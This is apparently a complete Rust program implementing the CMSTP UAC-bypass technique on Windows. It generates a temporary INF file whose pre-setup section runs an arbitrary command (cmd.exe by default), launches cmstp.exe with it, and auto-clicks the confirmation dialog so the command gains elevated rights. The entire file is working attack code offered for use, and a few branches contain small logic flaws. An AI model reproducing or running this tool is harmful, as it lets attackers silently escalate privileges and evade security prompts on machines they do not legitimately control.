use std::env::args;
use std::ffi::CString;
use std::fs::File;
use std::io::Write;
use std::process::{Command, Stdio};
use std::ptr::null_mut;
use std::thread;
use std::time::Duration;
use winapi::um::winuser::{FindWindowA, FindWindowExA, SendMessageA, SetForegroundWindow, ShowWindow, SW_SHOWNORMAL, BM_CLICK};
use winapi::um::winuser::{INPUT, INPUT_KEYBOARD, KEYBDINPUT, SendInput, VK_RETURN};

static INF_TEMPLATE: &str = r#"[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
REPLACE_COMMAND_LINE
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

[Strings]
ServiceName="CorpVPN"
ShortSvcName="CorpVPN"
"#;

fn generate_inf_file(command: &str) -> String {
    let temp_dir = "C:\\windows\\temp";
    let random_file_name = format!("{}\\{}.inf", temp_dir, uuid::Uuid::new_v4());
    let inf_data = INF_TEMPLATE.replace("REPLACE_COMMAND_LINE", command);

    let mut file = File::create(&random_file_name).expect("Failed to create INF file");
    file.write_all(inf_data.as_bytes()).expect("Failed to write INF file");

    random_file_name
}

fn execute_cmstp(inf_file: &str) {
    let binary_path = "C:\\windows\\system32\\cmstp.exe";

    if !std::path::Path::new(binary_path).exists() {
        eprintln!("cmstp.exe binary not found!");
        return;
    }

    let mut child = Command::new(binary_path)
        .arg("/au")
        .arg(inf_file)
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .expect("Failed to start cmstp.exe");

    let window_titles = ["CorpVPN", "cmstp"];

    for title in &window_titles {
        if interact_with_window(title) {
            break;
        }
    }

    child.wait().expect("Failed to wait on cmstp.exe");
}

fn interact_with_window(process_name: &str) -> bool {
    let class_name = CString::new(process_name).unwrap();

    loop {
        unsafe {
            let hwnd = FindWindowA(null_mut(), class_name.as_ptr());
            if hwnd.is_null() {
                continue;
            }

            SetForegroundWindow(hwnd);
            ShowWindow(hwnd, SW_SHOWNORMAL);

            let ok_button = FindWindowExA(hwnd, null_mut(), null_mut(), CString::new("OK").unwrap().as_ptr());
            if !ok_button.is_null() {
                SendMessageA(ok_button, BM_CLICK, 0, 0);
                return true;
            }

            simulate_keypress();
            return true;
        }
    }

    false
}

fn simulate_keypress() {
    unsafe {
        let mut input = INPUT {
            type_: INPUT_KEYBOARD,
            u: std::mem::zeroed(),
        };

        *input.u.ki_mut() = KEYBDINPUT {
            wVk: VK_RETURN as u16,
            wScan: 0,
            dwFlags: 0,
            time: 0,
            dwExtraInfo: 0,
        };

        SendInput(1, &mut input, std::mem::size_of::<INPUT>() as i32);
    }
}

fn main() {
    let args: Vec<String> = args().collect();

    let inf_file = if args.len() != 2 {
        let command_to_execute = "C:\\Windows\\System32\\cmd.exe";
        generate_inf_file(command_to_execute)
    } else if args.len() > 2 {
        eprintln!("Either specify a single file to be executed, or leave blank for the default value");
        return;
    } else {
        let command_to_execute = &args[1];
        generate_inf_file(command_to_execute)
    };

    execute_cmstp(&inf_file);
}
